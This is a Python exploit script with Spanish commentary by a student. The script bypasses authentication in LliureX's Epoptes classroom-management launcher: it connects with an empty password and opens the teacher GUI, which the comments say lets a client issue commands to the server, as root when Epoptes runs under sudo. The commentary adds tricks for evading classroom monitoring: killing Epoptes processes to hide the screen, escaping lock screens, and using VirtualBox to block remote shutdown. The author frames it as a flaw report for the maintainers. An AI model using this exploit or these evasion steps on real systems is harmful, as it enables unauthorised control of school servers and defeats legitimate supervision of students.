#! /usr/bin/python
# probando probandooo, guía de como pasar hasta el culo de forma supersencilla de los bloqueos de un sistema utilizado literalmente por el gobierno, aquí te la presento! Jaja, pero si se esfuerzan lo mismo en su seguridad nacional, que con las "webs" de bloqueo de otras webs prohibidas.. archivos HTML5 mal hechos, que ni siquiera bloquean nada, que es para lo que son, pagados con vuestros impuestos, porque yo aún no pago. Bueno a medias. Algún que otro IVA por juegos en Steam, y ya. (en serio, ir a https://bloqueadaseccionsegunda.cultura.gob.es/, es del gobierno, gobierno gobiernito, el mismo de pedrito sánchezito..)
#1- el mayor exploit que se por ahora, que te permite tener root (si tu profesor, o lo que sea, ha abierto epoptes usando "sudo epoptes" en la consola, en vez de como una persona normal, usando el desplegable de aplicaciones... porque literalmente NO PERDEIS NINGUNA FUNCIONALIDAD, Y ESTAS TOMANDO RIESGOS EXTRA POR NADA ARGHHHH):
# a ver a ver, es una vulnerabilidad presente en la ventana de inicio de sesión de Epoptes para acceder a la ventana principal de Epoptes sin necesidad de una cuenta de administrador (desde la cliente). He probado en mi casa con varias, y digo VARIAS distribuciones de Linux (kali, fedora, ubuntu... Coño, hasta en osx, que sí, es, técnicamente una distribución de Linux.), y solo funciona en la de Lliurex, En específico de la versión 20 para abajo. Ya me jodería.

#    Era especialmente fácil en las de:
#
#    Lliurex Server 19.07 (19.200727)
#    Lliurex Client 16.07 (16.200216)
#    Lliurex Server 16.07 (16.191025)
#    Lliurex Client 16.07 (16.180723)
#    Lliurex Client 16.06 (16.180420)


# El exploit funciona debido a cómo está diseñado el sistema de autenticación en el lanzador de Epoptes (cliente, otra vez) de lliurex. Una vez que el nombre de usuario y la contraseña están listos, el lanzador de Epoptes le indica al servidor que verifique si los datos son correctos. Si todo es correcto, el mismo archivo Python que abrió el lanzador de Epoptes abrirá la ventana principal de Epoptes. Esto se logra instanciando una nueva clase EpoptesGui, luego estableciendo el nombre de usuario y la contraseña en dos campos de la clase, y finalmente ejecutando Epoptes.

# El problema es que, independientemente del nombre de usuario y/o contraseña que introduzcas, la clase EpoptesGui abrirá la ventana principal de Epoptes de todas formas. A partir de ese momento, el servidor ejecutará cualquier orden del usuario sin verificar si los datos de autenticación son válidos o no. Básicamente, tu campo de nombre de usuario se convierte en... Un remote spam de comandos en el servidor. Jajaja esto me recuerda a esos días en el 2020 en los que para considerarte hacker en roblox solo tenías que encontrar un remote desprotejido y hacerle :FireServer y a tomar por culo, eras el rey de todo.


import os
import os.path
import sys
import epoptes

os.chdir("/usr/share/epoptes")

from twisted.internet import gtk2reactor
gtk2reactor.install()
from twisted.internet import reactor
from twisted.internet.protocol import ClientCreator
from twisted.protocols import amp

from epoptes.daemon import uiconnection
from epoptes.ui import gui
from epoptes.common import config
import xmlrpclib
# El prox cambia por máquina
prox = xmlrpclib.ServerProxy("https://server:9779", allow_none=True)
answer = prox.register_ip((os.environ["USER"], ""), "EpoptesServer", "")

epoptesGui = gui.EpoptesGui()
epoptesGui.n4d_user = os.environ["USER"]
epoptesGui.n4d_password = ""

d = ClientCreator(reactor, epoptes.daemon.uiconnection.Daemon, epoptesGui).connectTCP("server", 10000)

reactor.run()

#2- En caso de pantalla bloqueada:
# Usar la tecla de Windows (o cualqueira que tengas de home) para desplegar el menú de inicio. Cierras sesión, vuelves a abrirla, y voilà. En dos o tres clicks, has vuelto a tu escritorio, y ni siquiera has perdido lo que estuvieses haciendo, porque al no apagar, se mantiene abierto.
#3- en caso de TigerVNC Viewer en pantalla completa:
# Tecla de windows, se despliega el menú rápido, y ya puedes hacer alt+tab. Necesitas desplegar el menú, o no podrás salir.
#4- Bloqueo de internet
# Este depende. Hay algunos profesores que en vez de usar el método de darle click derecho, y quitarte el wifi, directamente usan Konsole para borrarte las directrices IP del ordenador. Menuda complicación. Bueno, es fácil impedir esto.
# - abre KSysGuard, y busca Epoptes en la lista. Si ves algún proceso que se llame "bash", abierto por root, estás papeado. Tu mejor apuesta? Desenchufarte del internet por el botón de abajo derecha, al lado del volumen, con forma de ordenador. No podrás seguir lo que estás haciendo hasta que te reconenctes manualmente, pero lo que tengas cargado, seguirá.
#5- Impedir vista de pantalla.
# Cansado de que te espíen como si fuese el puto govierno norcoreano???? No temas! Con esta solucion patentada de VaultTec, encontrada por nuestro más finos desarrolladores, que totalmente no han hecho la primera cosa que se les ha pasado por la cabeza, podrás pasar (un poco más) desapercibido! Solo abre KSysGuard, busca "Epoptes" en la lista de procesos, ctrl+click los procesos que hayan sido iniciados por tu nombre de usuario (osea, los que no sea "root") y presiona suprimir!
# Si ves que inmediatamente se abre otro proceso, también a tomar por culo. Esto elimina la vista pequeña que sale en la pantalla multiventana del pc servidor de epoptes. "Pero señor aarón" te preguntarás. "No pueden abrir en pantalla grande, la pantalla de mi ordenador??" y en ese caso, querido lector mío, me cago en tí porque tiene razón! Jajajaja, pero al menos sigue habiendo otro counter.
# Ya de por sí es raro que un profesor mire a ver por qué ese ordenador no tiene vista rápida, pero es que, al matar los procesos, sale como que tu ordenador se ha "desconectado" y luego "apagado", y la mayoría asume eso. si aún así, el profesor mira tu ventana, epoptes tiene otro problema, que digamos, no lo hace muy "sigiloso". Cuando el profesor pase su ratón encima de la ventana con la pantalla de tu ordenador, TÚ mouse se moverá. Así sabrás cuando te están mirando. Eso sí si tu profesor tiene 2 monitores, y deja tu ventana en el secundario, estás jodido chaval 😂😂
# 6??? No sé, ya me he olvidado. Este es para que no te apagen el ordenador.
# Probablemente... No, probablemente no. DEBES de tener VirtualBox en tu ordenador. Abrelo, y enciende una máquina virtual ligera (para que tu Todo en Uno no implosione al estar corriendo Windows 11 pro, que anda que tú también eliginedo ese sistema operativo superpesado y mal hecho para tus deberes de virtualbox...)
# un msdos o incluso ubuntu no gráfico bastará. Si no tienes una máquina virtual, ni sabes como hacerla, tira. Sal de aquí. Eso es como si un mecánico no sabe lo que es una llave inglesa. Ya solo tienes que tener la ventana del emulador abierta. Si quieres un bonus, sube tu volumen de alerta al 100% (con auriculares, claro). Esto lo que hace es que Virtualbox previene cualquier cierre de sesión, o incluso apagado /f del ordenador, porque quiere saber si prefieres irte con, o sin guardar el estado de la máquina.
# El ordenador no se podrá apagar hasta que confirmes una opción. Lo del volumen de aviso es porque cuando esto ocurre, el ordenador hace un... bueno, aviso, para decirte que no se ha podido apagar, y te pone una notificación justo encima de lo del volumen.
#7- Creo que eso es todo?? No sé no me acuerdo.
#~jaja hecho por aburrimiento por mí, aarón sánchez rico en mi tiempo libre. Llevo viendo estas fallas desde la ESO, y estoy muy seguro que Epoptes sigue siendo actualizado, y encima por una comunidad. Así que ya, como estoy a punto de irme, voy a apuntar todos estos fallos para que los corrijan. O tal vez ni lo hagan. Luego se quejan de que no hacemos los deberes.
# En serio, algo que teneis que apuntar, profesores, es que si restrinjís a los alumnos constántemente, no vais a crear "estudiantes modelo", sino supersoldados adaptados especialmente a pasar hasta el culo de estas restricciones.
# Eh eh antes de irte, por FAVOR permitid que la SAI tome reportes de webs erróneamente bloqueadas rellenados por ciudadanos. Hay webs que de verdad son útiles y necesarias (en mi caso, me ha llegado a joder bastante) que están bloqueadas porque uno de sus propósitos tiene que ver con los juegos o algo. Hay una que se dedica a noticias de informática, pero también de juegos que está bloqueada SOLO POR ESOOOOO
#~ 2/10/2024, DD/MM/AAAA, 9:42 P.M
